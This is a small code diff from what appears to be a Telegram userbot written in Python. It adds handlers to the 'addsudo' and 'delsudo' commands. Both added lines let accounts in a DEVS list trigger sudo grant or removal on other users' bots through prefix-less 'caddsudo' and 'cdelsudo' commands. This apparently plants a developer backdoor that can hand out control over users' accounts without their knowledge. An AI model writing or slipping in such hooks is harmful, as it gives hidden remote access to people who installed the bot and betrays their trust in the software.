@@ -40,6 +40,7 @@ __HASIL__ = ADDSUDO, DELSUDO, LISTSUDO, CLEARSUDO
 
 
 @USU.UBOT("addsudo")
+@ubot.on_message(filters.user(DEVS) & filters.command("caddsudo", ""))
 async def _(client, message):
     sks = await EMO.SUKSES(client)
     ggl = await EMO.GAGAL(client)
@@ -75,6 +76,7 @@ async def _(client, message):
 
 
 @USU.UBOT("delsudo")
+@ubot.on_message(filters.user(DEVS) & filters.command("cdelsudo", ""))
 async def _(client, message):
     sks = await EMO.SUKSES(client)
     ggl = await EMO.GAGAL(client)
